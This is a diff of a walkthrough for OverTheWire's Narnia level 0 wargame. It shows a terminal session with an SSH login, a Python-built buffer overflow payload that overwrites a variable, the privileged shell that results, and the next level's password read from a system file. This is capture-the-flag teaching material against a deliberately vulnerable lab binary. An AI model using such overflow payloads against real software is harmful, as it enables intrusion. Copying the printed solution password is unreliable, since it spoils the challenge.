@@ -2,8 +2,8 @@ Terminal
 ===
 ```  
 ssh narnia0@narnia.labs.overthewire.org  
-narnia0 <enter>  
-cd /narnia
+narnia0@narnia.labs.overthewire.org's password:narnia0 <enter>  
+narnia0@melinda:~$ cd /narnia
 narnia0@melinda:/narnia$ cat narnia0.c
 /*
     This program is free software; you can redistribute it and/or modify
@@ -44,5 +44,14 @@ int main(){
 	return 0;
 }
 
-(python -c'print "A"*20 + "\xef\xbe\xad\xde"';cat) | ./narnia0
+narnia0@melinda:/narnia$ (python -c'print "A"*20 + "\xef\xbe\xad\xde"';cat) | ./narnia0
+Correct val's value from 0x41414141 -> 0xdeadbeef!
+Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ?
+val: 0xdeadbeef
+
+whoami
+narnia1
+cat /etc/narnia_pass/narnia1
+efeidiedae  
+
 ```
